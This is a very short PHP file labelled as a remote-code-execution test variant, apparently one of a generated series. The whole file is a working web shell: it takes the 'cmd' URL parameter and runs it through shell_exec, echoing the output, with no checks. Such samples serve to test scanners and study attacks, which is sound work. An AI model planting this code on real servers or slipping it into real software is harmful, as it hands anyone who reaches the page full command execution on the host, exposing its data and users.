<?php
// RCE test variation #477
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>